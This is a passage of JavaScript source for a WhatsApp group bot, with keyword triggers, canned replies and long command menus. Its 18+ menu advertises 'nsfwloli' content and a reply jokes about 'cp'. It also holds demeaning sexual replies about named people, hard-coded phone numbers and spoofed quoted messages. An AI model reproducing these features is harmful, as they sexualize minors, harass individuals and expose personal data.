tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
}
if (budy.match('Blackwalker')) {
result = fs.readFileSync(`./src/mask.webp`)
tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
}
if (budy.match('dragu')) {
result = fs.readFileSync(`./src/mask.webp`)
tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
}
if ((budy.includes('വെട്രി')) || (budy.includes('vetri'))) {
reply('What’s funny?🤨')
}
if ((budy.includes('+വെട്രി')) || (budy.includes('+vetri'))) {
tiringa.updatePresence(from, Presence.composing)
		const safust = fs.readFileSync('./src/vetri.mp3')
	tiringa.sendMessage(from, safust, MessageType.audio, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, mimetype: 'audio/mp4', ptt:true})
}
if ((budy.includes('JZmods')) || (budy.includes('918089276308'))) {
tiringa.updatePresence(from, Presence.composing)
		const safust = fs.readFileSync('/sdcard/botm/new.mp3')
	tiringa.sendMessage(from, safust, MessageType.audio, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, mimetype: 'audio/mp4', ptt:true})
}
if (budy.match('Dragu')) {
result = fs.readFileSync(`./src/mask.webp`)
tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
}

if (budy.match("919446088620")){
		tiringa.updatePresence(from, Presence.composing)
		const safus = fs.readFileSync('./9567.m4a')
	tiringa.sendMessage(from, safus, MessageType.audio, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, mimetype: 'audio/mp4', ptt:true}) 	   
        }         
if (budy.match("919072821787")){
		tiringa.updatePresence(from, Presence.composing)
		const safus1 = fs.readFileSync('./9567.m4a')
        tiringa.sendMessage(from, safus1, MessageType.audio, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek, mimetype: 'audio/mp4', ptt:true})            
} else if (budy.match('☻︎')) {
result = fs.readFileSync(`./src/mask.webp`)
tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
} else if (budy.match('-_/')) {
result = fs.readFileSync(`./src/mask.webp`)
tiringa.sendMessage(from, result, sticker, {thumbnail: dnsnew, sendEphemeral: true,quoted: mek })
}

switch(testat) {
//_ COMANDOS Z24
case 'lia':
case 'Lia':
case 'LIA':
if (!isGroup) return reply( 'L-Lia-chan 😳👉👈')
break
               
case 'eat':
case 'Eat':
case 'EAT':
if (!isGroup) return reply( 'Wing the madman who likes acoustic poetryKKKKKKKKK')
break

case 'braia':
case 'Braia':
case 'BRAIA':
if (!isGroup) return reply( 'Lek of the big ass😋')
break
             
case 'gil':
case 'Gil':
case 'GIL':
if (!isGroup) return reply( 'Make me make figures G-gilson-chan 😔👉👈')
break

case 'edu':
case 'Edu':
case 'EDU':
if (!isGroup) return reply( 'Oi do, you could deposit R $3,000 in my account?🥺👉👈')
break

case 'insidu':
case 'Insidu':
case 'INSIDU':
if (!isGroup) return reply( 'Oh the cp mnkkkkkkkk')
break

case 'xavoso':
case 'Xavoso':
case 'XAVOSO':
if (!isGroup) return reply( 'Come on fuck?💪😏')
break

case 'tada':
case 'Tada':
case 'TADA':
if (!isGroup) return reply( 'Tada is not a ghost😙')
break
case 'help':
case 'Help':
case 'menu':
case 'Menu':
textmenu = `        ────────────────
oi ${pushname} use ${prefix}menu ‍♂️
        ────────────────`
reply(textmenu)
break
}
             
//_COMANDOS
switch(command) {
//_MENU
case 'menu':

msgFilter.isFiltered(from)
const useLevel = getLevelingLevel(sender)
const useXp = getLevelingXp(sender)
const xingg = getLevelingId(sender)
const useTime = getRegisterTime(sender) 
const requireXp = 20 * Math.pow(useLevel, 2) + 150 * useLevel + 1000
const chec = getLevelingId(sender)
if (useLevel === undefined && chec === undefined) addLevelingId(sender)
uptime = process.uptime()
myMonths = ["January", "February", "March", "Apri", "May", "June", "Julay", "Agust", "September", "October", "November", "Desember"];
myDays = ['thinkal','chovva','budhan','vyayam','velli','shani' ,'njayar'];
var tglk = new Date();
var day = tglk.getDate()
bulan = tglk.getMonth()
var thisDay = tglk.getDay(),
thisDay = myDays[thisDay];
var yy = tglk.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
const tanggal = `${thisDay}, ${day} de ${myMonths[bulan]} de ${year}`
const serial = getRegisterSerial(sender)
const idade = getRegisterAge(sender)
const nreg = getRegisterName(sender)
const checATM = checkATMuser(sender)
const users = `${_level.length}`
const chatss = `${totalchat.length}`
const comandost = totalcmd
if(useLevel == undefined && useXp == undefined){
}
dtod = "919446088620@s.whatsapp.net"
const dragu = "919446088620@s.whatsapp.net"
const daca = fs.readFileSync(`./menu.jpg`)
const emo = ["➬","➫","➪","➩","➭"]
emoji = emo[Math.floor(Math.random() * emo.length)]
const emo1 = ["➳","➵","➺","➸","➻"]
emoji1 = emo1[Math.floor(Math.random() * emo1.length)]
const emo2 = ["✢","✣","✤","✥","✦"]
emoji2 = emo2[Math.floor(Math.random() * emo2.length)]
const emo3 = ["✧","✩","✪","✫","✬"]
emoji3 = emo3[Math.floor(Math.random() * emo3.length)]
const emo4 = ["✭","✮","✯","✰","✲"]
emoji4 = emo4[Math.floor(Math.random() * emo4.length)]
const emo5 = ["✲","⧐","⧴","✵","✶"]
emoji5 = emo5[Math.floor(Math.random() * emo5.length)]
const emo6 = ["❃","❆","❅","❈","⩥"]
emoji6 = emo6[Math.floor(Math.random() * emo6.length)]

cmenu = `
┍━━━━┥ *White-WᴀʟᴋᴇR* ┝━━━━
│
┝☐ ${emoji} ᴘʀᴇғɪx: *❴${prefix}❵*
│
┝☐ ${emoji} ɴᴀᴍᴇ: _ʙʟᴀᴄᴋ-ᴡᴀʟᴋᴇʀ_
│
┝☐ ${emoji} ᴠᴇʀsɪᴏɴ: 3.0ᴠ
│
┝☐ ${emoji} sᴛᴀᴛᴜs: ᴏɴ✓
│
┝☐ ${emoji} ɢʀᴏᴜᴘ: _${groupName}_
│
┝☐ ${emoji} ᴜsᴇʀs: _${users}_
│
┝☐ ${emoji} ᴛᴏᴛᴀʟ ᴄʜᴀᴛs: _${chatss}_
│
┝☐ ${emoji} ᴛᴏᴛᴀʟ ᴄᴍᴅs: _421_
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴜsᴇʀ ɪɴғᴏ* ┝━━━━
│
┝☐ ${emoji1} ɴᴀᴍᴇ: *${pushname}*
│
┝☐ ${emoji1} ᴛʏᴘᴇ: *${prema}*
│
┝☐ ${emoji1} ᴄᴀsʜ: *${checATM}*
│
┝☐ ${emoji1} ʟᴇᴠᴇʟ: *${useLevel}*
│
┝☐ ${emoji1} xᴘ: *${useXp}/${requireXp}*
│
┝☐ ${emoji1} ᴍᴇᴅᴀʟ: *${patt}*
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴍᴇɴᴜ ʟɪsᴛ* ┝━━━━
│
┝☐ ${emoji2} ${prefix}ᴍ18
│
┝☐ ${emoji2} ${prefix}sᴍᴇɴᴜ
│
┝☐ ${emoji2} ${prefix}ᴍᴍᴇɴᴜ
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ɪɴғᴏʀᴍᴀᴛɪᴏɴ* ┝━━━━
│
┝☐ ${emoji3} ${prefix}ɪɴғᴏ
│
┝☐ ${emoji3} ${prefix}ᴏᴡɴᴇʀ
│
┝☐ ${emoji3} ${prefix}ᴄʀᴇᴅɪᴛs
│
┝☐ ${emoji3} ${prefix}ᴘɪɴɢ
│
┝☐ ${emoji3} ${prefix}ᴘʀᴏғɪʟᴇ
│
┝☐ ${emoji3} ${prefix}ɪɴғᴏɢᴘ
│
┝☐ ${emoji3} ${prefix}ᴛs
│
┝☐ ${emoji3} ${prefix}ʙᴜɢʀᴇᴘᴏʀᴛ
│
┝☐ ${emoji3} ${prefix}ʀᴇǫᴜᴇsᴛ
│
┝☐ ${emoji3} ${prefix}ᴅᴏɴᴀᴛᴇ
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ɢʀᴏᴜᴘ ᴏɴʟʏ* ┝━━━━
│
┝☐ ${emoji4} ${prefix}ʟɪsᴛᴀᴅᴍɪɴ
│
┝☐ ${emoji4} ${prefix}ᴏɴʟɪɴᴇ
│
┝☐ ${emoji4} ${prefix}ᴏᴘᴇɴɢ
│
┝☐ ${emoji4} ${prefix}ᴄʟᴏsᴇɢ
│
┝☐ ${emoji4} ${prefix}ᴘʀᴏᴍᴏᴛᴇ
│
┝☐ ${emoji4} ${prefix}ᴅᴇᴍᴏᴛᴇ
│
┝☐ ${emoji4} ${prefix}sᴇᴛɴᴀᴍᴇ
│
┝☐ ${emoji4} ${prefix}sᴇᴛᴅᴇsᴋ
│
┝☐ ${emoji4} ${prefix}ᴛᴀɢᴀʟʟ
│
┝☐ ${emoji4} ${prefix}ʟɪɴᴋɢᴄ
│
┝☐ ${emoji4} ${prefix}ʟᴇᴀᴠᴇ
│
┝☐ ${emoji4} ${prefix}ɴᴏᴛɪғ
│
┝☐ ${emoji4} ${prefix}ᴡᴇʟᴄᴏᴍᴇ
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴍᴇᴅɪᴀ* ┝━━━━
│
┝☐ ${emoji5} ${prefix}sǫᴜɪʀʀʟ
│
┝☐ ${emoji5} ${prefix}sʟᴏᴡ
│
┝☐ ${emoji5} ${prefix}ғᴀsᴛ
│
┝☐ ${emoji5} ${prefix}ɢᴇᴍᴜᴋ
│
┝☐ ${emoji5} ${prefix}ɴɪɢʜᴛᴄᴏʀᴇ
│
┝☐ ${emoji5} ${prefix}ᴇʀʀᴀᴘᴇ
│
┝☐ ${emoji5} ${prefix}ʙᴀss
│
┝☐ ${emoji5} ${prefix}ʀᴇᴠᴇʀsᴇᴠɪᴅ
│
┝☐ ${emoji5} ${prefix}ғᴀsᴛᴠɪᴅ
│
┝☐ ${emoji5} ${prefix}sʟᴏᴡᴠɪᴅ
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ғᴜɴ ᴍᴇɴᴜ* ┝━━━━
│
┝☐ ${emoji6} ${prefix}sɪᴍɪ
│
┝☐ ${emoji6} ${prefix}ғᴀᴋᴇᴀᴅᴅʀᴇss
│
┝☐ ${emoji6} ${prefix}sʜɪᴛsᴘᴏᴛ
│
┝☐ ${emoji6} ${prefix}ʀᴏʟʟ
│
┝☐ ${emoji6} ${prefix}ɴᴀᴍᴇɴɪɴᴊᴀ
│
┝☐ ${emoji6} ${prefix}ᴀᴍᴏɴɢᴜs
│
┝☐ ${emoji6} ${prefix}ᴛᴀɢᴍᴇ
│
┝☐ ${emoji6} ${prefix}ʀᴘs
│
┝☐ ${emoji6} ${prefix}sɴ
│
┝☐ ${emoji6} ${prefix}ᴄᴀᴛᴛʟᴇ
│
┝☐ ${emoji6} ${prefix}ᴄʜᴀɴᴄᴇ
│
┝☐ ${emoji6} ${prefix}sᴛɪᴄᴋ
│
┝☐ ${emoji6} ${prefix}ɢᴀʏ
│
┝☐ ${emoji6} ${prefix}sʟᴏᴛ
│
┝☐ ${emoji6} ${prefix}sɴᴀɪʟ
│
┝☐ ${emoji6} ${prefix}ʟᴇᴠᴇʟ
│
┝☐ ${emoji6} ${prefix}ʀᴏᴜʟᴇᴛᴛᴇ
│
┝☐ ${emoji6} ${prefix}ᴛᴛᴛ
│
┝☐ ${emoji6} ${prefix}ʙᴜᴛ
│
┝☐ ${emoji6} ${prefix}ᴛᴏᴘ5
│
┕━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴀɴɪᴍᴇ* ┝━━━━
│
┝☐ ${emoji5} ${prefix}ᴀɴɪᴍᴇ
│
┝☐ ${emoji5} ${prefix}ʟᴏʟɪ
│
┝☐ ${emoji5} ${prefix}ɴᴇᴋᴏ
│
┝☐ ${emoji5} ${prefix}ɴᴇᴢᴜᴋᴏ
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴛᴏᴏʟs* ┝━━━━
│
┝☐ ${emoji4} ${prefix}sᴛɪᴄᴋᴇʀ
│
┝☐ ${emoji4} ${prefix}ᴛᴏɪᴍɢ
│
┝☐ ${emoji4} ${prefix}ᴛᴏᴍᴘ3
│
┝☐ ${emoji4} ${prefix}ɪᴍɢ
│
┝☐ ${emoji4} ${prefix}ᴘʟᴀʏ
│
┝☐ ${emoji4} ${prefix}ᴛᴛs
│
┝☐ ${emoji4} ${prefix}ᴛɪᴍᴇʀ
│
┝☐ ${emoji4} ${prefix}ᴛɪᴍᴇ
│
┝☐ ${emoji4} ${prefix}ᴡᴀᴍᴇ
│
┝☐ ${emoji4} ${prefix}ᴏᴄʀ
│
┝☐ ${emoji4} ${prefix}ᴄᴇᴘ
│
┝☐ ${emoji4} ${prefix}ᴄᴀʀᴅ
│
┝☐ ${emoji4} ${prefix}ᴛᴇʟʟ
│
┝☐ ${emoji4} ${prefix}ᴡᴇᴀᴛʜᴇʀ
│
┝☐ ${emoji4} ${prefix}ᴛᴏɢɪғ
│
┝☐ ${emoji4} ${prefix}ɢɪᴍᴀɢᴇ
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴅᴏᴡɴʟᴏᴀᴅᴇʀ* ┝━━━━
│
┝☐ ${emoji3} ${prefix}ʏᴛᴍᴘ3
│
┝☐ ${emoji3} ${prefix}ʏᴛᴍᴘ4
│
┕━━━━━━━━━━━━━━━━━━━
┍━━━━┥ *ᴏᴡɴᴇʀ* ┝━━━━
│
┝☐ ${emoji2} ${prefix}ᴄʟᴏɴᴇ
│
┝☐ ${emoji2} ${prefix}ʙʟᴏᴄᴋ
│
┝☐ ${emoji2} ${prefix}ᴜɴʙʟᴏᴄᴋ
│
┝☐ ${emoji2} ${prefix}ʙᴀɴ
│
┝☐ ${emoji2} ${prefix}ᴜɴʙᴀɴ
│
┝☐ ${emoji2} ${prefix}ᴀᴅᴅᴘʀᴇᴍ
│
┝☐ ${emoji2} ${prefix}ᴅᴇʟᴘʀᴇᴍ
│
┕━━━━━━━━━━━━━━━━━━
`
		tiringa.sendMessage(from, daca, image, {thumbnail: dnsnewx, sendEphemeral: true,quoted: ftoko, caption: cmenu, contextInfo: {"mentionedJid": [dragu] }})
break
case 'help2x':
case 'Help2x':
case 'menu2x':
case 'Menu2x':
textmenu = `        ────────────────
oi ${pushname} use ${prefix}menu in case you want to use my commands🧙‍♂️
        ────────────────`
reply(textmenu)
break
}
             
//_COMANDOS
switch(command) {
//_MENU
case 'menu2x':

msgFilter.isFiltered(from)
const useLevel = getLevelingLevel(sender)
const useXp = getLevelingXp(sender)
const xingg = getLevelingId(sender)
const useTime = getRegisterTime(sender) 
const requireXp = 20 * Math.pow(useLevel, 2) + 150 * useLevel + 1000
const chec = getLevelingId(sender)
if (useLevel === undefined && chec === undefined) addLevelingId(sender)
uptime = process.uptime()
myMonths = ["January", "February", "March", "Apri", "May", "June", "Julay", "Agust", "September", "October", "November", "Desember"];
myDays = ['njayar','thinkal','chovva','budhan','bayem','velli','shani'];
var tglk = new Date();
var day = tglk.getDate()
bulan = tglk.getMonth()
var thisDay = tglk.getDay(),
thisDay = myDays[thisDay];
var yy = tglk.getYear()
var year = (yy < 1000) ? yy + 1900 : yy;
const tanggal = `${thisDay}, ${day} de ${myMonths[bulan]} de ${year}`
const serial = getRegisterSerial(sender)
const idade = getRegisterAge(sender)
const nreg = getRegisterName(sender)
const checATM = checkATMuser(sender)
const users = `${_level.length}`
const chatss = `${totalchat.length}`
const comandost = totalcmd
if(useLevel == undefined && useXp == undefined){
}
dtod = "919446088620@s.whatsapp.net"
const daca = fs.readFileSync('./team.jpg');
cmenu = `
╔════□ *_White WᴀʟᴋᴇR_* □
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼
║├► ⊛ ᴘʀᴇғɪx: *_「${prefix}」_*
║│
║├► ⊛ ɴᴀᴍe: *White-Walker*
║│
║├► ⊛ ᴠᴇʀsɪᴏn: *2.0*
║│
║├► ⊛ sᴛᴀᴛᴜs: *ON✅*
║│
║├► ⊛ ɢʀᴏᴜp: *${groupName}*
║│
║├► ⊛ ᴛᴏᴛᴀl ᴜsᴇr: *${users} users*
║│
║├► ⊛ ᴛᴏᴛᴀl ᴄʜᴀᴛs: ${chatss} chats
║│
║├► ⊛ ᴛᴏᴛᴀl ᴄᴏᴍᴍᴀɴds: 392
║│
║├► ⊛ ᴛᴏᴛᴀl ᴄᴏᴍᴍᴀnds ᴜsᴇd: ${comandost}
║│
║├► ⊛ sᴄʀɪᴘt: *youtube.com/channel/UC_s1BwbII5vuw67ZGnptWIQ*
║│
║├► ֍ ᴜᴏʟᴏᴀd sᴏᴏɴer
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╼╯
╠═════ ≪ •❈• ≫ ═════╝
╠════👨‍💻USER👨‍💻═════
║
║
║⊛ Name: ${pushname}
║⊛ User type: ${prema}
║⊛ Cash: ${checATM}
║⊛ Level: ${useLevel}
║⊛ XP: ${useXp}/${requireXp}
║⊛ Tier: ${patt}
╠════♻️NEWS══════
║ 
║
║❧ menu +18 use =m18
╠═══════════════
║✅  NEW COMMANDS:
║
║❧ simi
║❧ bugreport
║❧ request
╠═══════════════
║✔ REMOVED:     
║
║❧ nekonime
╠═══════════════
║⚠️NOTICE:
║
║❧ White Walker 2 Coming soon...
╠═══════════════
║
╠═══════════════
╠════ 🧙‍♂️ INFORMATION 🧙‍♂️
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}info*
║│
║│ *☛•${prefix}owner*
║│
║│ *☛•${prefix}ping*
║│
║│ *☛•${prefix}profile*
║│
║│ *☛•${prefix}infogp*
║│
║│ *☛•${prefix}ts*
║│
║│ *☛•${prefix}bugreport*
║│
║│ *☛•${prefix}request*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾╼╯
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 🔞 +18 🔞
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}m18*
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 👥 GRUP 👥
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}listadmin*
║│
║│ *☛•${prefix}online*
║│
║│ *☛•${prefix}close*
║│
║│ *☛•${prefix}open*
║│
║│ *☛•${prefix}promote*
║│
║│ *☛•${prefix}demote*
║│
║│ *☛•${prefix}setname*
║│
║│ *☛•${prefix}setdesk*
║│
║│ *☛•${prefix}tagall*
║│
║│ *☛•${prefix}linkgc*
║│
║│ *☛•${prefix}leave*
║│
║│ *☛•${prefix}notif*
║│
║│ *☛•${prefix}welcome*
║│
║│ *☛•${prefix}delete*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 🎥  MEDIA 🎥
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}squirrel (mark an audio)*
║│
║│ *☛•${prefix}slow (mark an audio)*
║│
║│ *☛•${prefix}gemuk (mark an audio)*
║│
║│ *☛•${prefix}bass (mark an audio)*
║│
║│ *☛•${prefix}earrape*
║│
║│ *☛•${prefix}fast*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 🏖 IMAGE 🏖
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}gtav (Img)*
║│
║│ *☛•${prefix}wanted (Img)*
║│
║│ *☛•${prefix}drawing (Img)*
║│
║│ *☛•${prefix}8bit (Text)*
║│
║│ *☛•${prefix}lovepaper (Text)*
║│
║│ *☛•${prefix}narutobanner (Text)*
║│
║│ *☛•${prefix}romancetext (Text)*
║│
║│ *☛•${prefix}shadowtext (Text)*
║│
║│ *☛•${prefix}tiktokeffect (Text)*
║│
║│ *☛•${prefix}neon (Text)*
║│
║│ *☛•${prefix}hpotter (Text)*
║│
║│ *☛•${prefix}gaming (Text)*
║│
║│ *☛•${prefix}bneon (Text)*
║│
║│ *☛•${prefix}matrix (Text)*
║│
║│ *☛•${prefix}breakwall (Text)*
║│
║│ *☛•${prefix}dropwater (Text)*
║│
║│ *☛•${prefix}wolflogo (Text)*
║│
║│ *☛•${prefix}tfire (Text)*
║│
║│ *☛•${prefix}sandw (Text)*
║│
║│ *☛•${prefix}firofiro (Text)*
║│
║│ *☛•${prefix}text3d (Text)*
║│
║│ *☛•${prefix}text3d2 (Text)*
║│
║│ *☛•${prefix}phlogo (Text)*
║│
║│ *☛•${prefix}bpmek (Text)*
║│
║│ *☛•${prefix}folhas (Text)*
║│
║│ *☛•${prefix}tlight (Text)*
║│
║│ *☛•${prefix}sparkling (Text)*
║│
║│ *☛•${prefix}neve (Text)*
║│
║│ *☛•${prefix}crismes (Text)*
║│
║│ *☛•${prefix}retro (Text)*
║│
║│ *☛•${prefix}watercolor*
║│
║│ *☛•${prefix}pubglogo (Text)*
║│
║│ *☛•${prefix}bf4 (Text)*
║│
║│ *☛•${prefix}cslogo (Text)*
║│
║│ *☛•${prefix}lithgtext (Text)*
║│
║│ *☛•${prefix}silktext (Text)*
║│
║│ *☛•${prefix}flametext (Text)*
║│
║│ *☛•${prefix}crosslogo (Text)*
║│
║│ *☛•${prefix}glowtext (Text)*
║│
║│ *☛•${prefix}triggered*
║│
║│ *☛•${prefix}wasted*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 🎲 FUN 🎲
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}simi*
║│
║│ *☛•${prefix}shitpost*
║│
║│ *☛•${prefix}nameninja (Text)*
║│
║│ *☛•${prefix}tagme*
║│
║│ *☛•${prefix}dado/roll*
║│
║│ *☛•${prefix}RPS (rock Paper Scissors)*
║│
║│ *☛•${prefix}sn*
║│
║│ *☛•${prefix}cattle*
║│
║│ *☛•${prefix}chance*
║│
║│ *☛•${prefix}stick*
║│
║│ *☛•${prefix}gay*
║│
║│ *☛•${prefix}slot*
║│
║│ *☛•${prefix}snail*
║│
║│ *☛•${prefix}level*
║│
║│ *☛•${prefix}roulette*
║│
║│ *☛•${prefix}amongus*
║│
║│ *☛•${prefix}ttt*
║│
║│ *☛•${prefix}but*
║│
║│ *☛•${prefix}top5*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 💮 ANIME 💮
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}anime*
║│
║│ *☛•${prefix}loli*
║│
║│ *☛•${prefix}neko*
║│
║│ *☛•${prefix}nezuko*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 🔧 TOOLS 🔧
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}s*
║│
║│ *☛•${prefix}sticker*
║│
║│ *☛•${prefix}toimg*
║│
║│ *☛•${prefix}tomp3*
║│
║│ *☛•${prefix}Img (Text)*
║│
║│ *☛•${prefix}play (qualification)*
║│
║│ *☛•${prefix}tts*
║│
║│ *☛•${prefix}timer (time)*
║│
║│ *☛•${prefix}wame*
║│
║│ *☛•${prefix}ocr*
║│
║│ *☛•${prefix}cep (cep)*
║│
║│ *☛•${prefix}card*
║│
║│ *☛•${prefix}tell*
║│
║│ *☛•${prefix}weather*
║│
║│ *☛•${prefix}togif*
║│
║│ *☛•${prefix}gimage*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 📲 DOWNLOADER 📲
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}ytmp3 (link)*
║│
║│ *☛•${prefix}ytmp4 (link)*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╠═════ ≪ •❈• ≫ ═════╝
║
╠═══════════════
╠════ 🕴 CREATOR 🕴
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}clone*
║│
║│ *☛•${prefix}block*
║│
║│ *☛•${prefix}unblock*
║│
║│ *☛•${prefix}blocklist*
║│
║│ *☛•${prefix}ban*
║│
║│ *☛•${prefix}unban*
║│
║│ *☛•${prefix}addprem*
║│
║│ *☛•${prefix}dellprem*
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╚═════ ≪ •❈• ≫ ═════╝`
tiringa.sendMessage(from, cmenu, text, { thumbnail: dnsnew, sendEphemeral: true,quoted: {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) },message: {"imageMessage": {"mimetype": "image/jpeg", "caption": `oi ${pushname}\nits my menu bro`, "jpegThumbnail": fs.readFileSync(`./team.jpg`)}, contextInfo: { forwardingScore: 20, isForwarded: true, mentionedJid: [dtod]}, caption: cmenu}}})
break
case 'm18':
if (!isNsfw) return reply(ptbr.nsfw())
nsfm = `If any command is wrong, notify the
wa.me/+919446088620
▀▄▀▄▀▄▀▄▀▄▀▄▀▄▀▄
╔════ 🔞 +18 🔞 ════
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}ʜᴏʟo*
║│
║│ *☛•${prefix}sᴏʟᴏ*
║│
║│ *☛•${prefix}ᴇʀᴏ*
║│
║│ *☛•${prefix}sᴘᴀɴk*
║│
║│ *☛•${prefix}ᴇʀᴏғᴇᴇt*
║│
║│ *☛•${prefix}ғᴇᴇt*
║│
║│ *☛•${prefix}ʜᴏʟᴏᴇʀᴏ*
║│
║│ *☛•${prefix}ᴄʟᴀsɪc*
║│
║│ *☛•${prefix}ᴄᴜm*
║│
║│ *☛•${prefix}ᴇʀᴏʏᴜʀi*
║│
║│ *☛•${prefix}ᴇʀᴏn*
║│
║│ *☛•${prefix}ᴘᴡᴀɴᴋg*
║│
║│ *☛•${prefix}ᴀɴᴀl*
║│
║│ *☛•${prefix}ʟᴇᴡᴅᴋᴇᴍo*
║│
║│ *☛•${prefix}ʟᴇᴡd*
║│
║│ *☛•${prefix}sᴏʟᴏg*
║│
║│ *☛•${prefix}ʟᴇᴡᴅk*
║│
║│ *☛•${prefix}ʜᴇɴᴛᴀi*
║│
║│ *☛•${prefix}ʙʟᴏᴡᴊᴏb*
║│
║│ *☛•${prefix}ʜᴏʟᴏʟᴇᴡd*
║│
║│ *☛•${prefix}ᴛʀᴀp*
║│
║│ *☛•${prefix}ʟᴇs*
║│
║│ *☛•${prefix}sᴍᴀʟʟʙᴏᴏʙs*
║│
║│ *☛•${prefix}ғᴜᴛᴀɴᴀʀi*
║│
║│ *☛•${prefix}ғᴇᴍᴅᴏm*
║│
║│ *☛•${prefix}ғᴇᴇd*
║│
║│ *☛•${prefix}ᴇʀᴏk*
║│
║│ *☛•${prefix}ғᴇᴇᴛg*
║│
║│ *☛•${prefix}ᴇʀᴏᴋᴇᴍo*
║│
║│ *☛•${prefix}ʙᴏᴏʙs*
║│
║│ *☛•${prefix}ɴsғᴡʟᴏʟi*
║│
║│ *☛•${prefix}ᴘᴜssy*
║│
║│ *☛•${prefix}ᴛɪᴛs* 1, 2, 3, 4..,
║│
║╰╼╾╼╾╼╾╼╾╼╾╼╾╼╾
╚══╡*_White ᴡᴀʟᴋᴇR_*╞══╝`
tiringa.sendMessage(from, nsfm, text, {quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": "💦👙👙", 'jpegThumbnail': fs.readFileSync('./black.webp')}}}})
break
case 'makermenu':
case 'mmenu':

nsfmre = `|||
╠═══════════════
╠════ 🏖 IMAGE 🏖═
║╭╼╾╼╾╼╾╼╾╼╾╼╾╼╾
║│ *☛•${prefix}gtav (Img)*
║│
║│ *☛•${prefix}wanted (Img)*
║│
║│ *☛•${prefix}drawing (Img)*
║│
║│ *☛•${prefix}8bit (Text)*
║│
║│ *☛•${prefix}lovepaper (Text)*
║│
║│ *☛•${prefix}narutobanner (Text)*
║│
║│ *☛•${prefix}romancetext (Text)*
║│
║│ *☛•${prefix}shadowtext (Text)*
║│
║│ *☛•${prefix}tiktokeffect (Text)*
║│
║│ *☛•${prefix}neon (Text)*
║│
║│ *☛•${prefix}hpotter (Text)*
║│
║│ *☛•${prefix}gaming (Text)*
║│
║│ *☛•${prefix}bneon (Text)*
║│
║│ *☛•${prefix}matrix (Text)*
║│
║│ *☛•${prefix}breakwall (Text)*
║│
║│ *☛•${prefix}dropwater (Text)*
║│
║│ *☛•${prefix}wolflogo (Text)*
║│
║│ *☛•${prefix}tfire (Text)*
║│
║│ *☛•${prefix}sandw (Text)*
║│
║│ *☛•${prefix}firofiro (Text)*
║│
║│ *☛•${prefix}text3d (Text)*
║│
║│ *☛•${prefix}text3d2 (Text)*
║│
║│ *☛•${prefix}phlogo (Text)*
║│
║│ *☛•${prefix}bpmek (Text)*
║│
║│ *☛•${prefix}folhas (Text)*
║│
║│ *☛•${prefix}tlight (Text)*
║│
║│ *☛•${prefix}sparkling (Text)*
║│
║│ *☛•${prefix}neve (Text)*
║│
║│ *☛•${prefix}crismes (Text)*
║│
